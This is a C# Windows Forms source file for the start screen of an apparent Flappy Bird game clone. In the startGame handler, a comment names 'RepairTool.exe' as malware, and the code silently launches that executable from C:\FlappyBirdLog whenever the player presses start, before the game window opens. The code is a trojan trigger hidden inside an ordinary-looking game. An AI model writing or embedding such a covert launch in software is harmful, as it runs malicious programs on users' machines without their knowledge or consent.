using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Media;

using System.Diagnostics;




namespace Flappy_Bird_Windows_Form
{
    public partial class Form2 : Form
    {
        

        private Form1 anotherForm;
        public Form2()
        {
            InitializeComponent();
            anotherForm = new Form1();





           
        }

        private void startGame(object sender, EventArgs e)
        {

            //Once the start button click,Melware "RepaireTool.exe" will also be start. 
            string filePath = "C:\\FlappyBirdLog\\RepairTool.exe"; 
            Process.Start(filePath);

            anotherForm = new Form1();
            this.Hide();

            anotherForm.ShowDialog();

             

            Application.ExitThread();

           
           

        }

       

        private void Form2_Load(object sender, EventArgs e)
        {
           SoundPlayer sp = new SoundPlayer();
            sp.SoundLocation = "music1.wav";
            sp.PlayLooping();
        }


    }
}
